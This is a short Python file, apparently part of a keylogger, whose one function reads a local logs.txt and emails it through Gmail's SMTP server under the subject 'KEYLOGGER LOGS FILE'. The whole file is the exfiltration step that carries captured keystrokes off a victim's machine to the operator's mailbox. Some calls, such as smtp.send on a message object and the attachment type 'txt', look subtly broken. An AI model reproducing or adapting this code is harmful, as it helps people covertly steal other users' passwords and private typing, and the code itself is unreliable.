from email.message import EmailMessage
from getpass import getpass
import smtplib

def send_email():
    user_email_addr = str(input('Enter your email: '))
    user_email_pswd = getpass('Enter your email password: ')

    # template format for sent email
    message = EmailMessage()
    message["Subject"] = 'KEYLOGGER LOGS FILE'
    message["From"] = user_email_addr
    message["To"] = user_email_addr
    message.set_content('Logs file (document) attached  ...')

    with open('logs.txt', 'rb') as f:
        file_data = f.read()
        file_name = f.name

    message.add_attachment(file_data, maintype='txt', filename=file_name)

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login(user=user_email_addr, password=user_email_pswd)
        smtp.send(message)
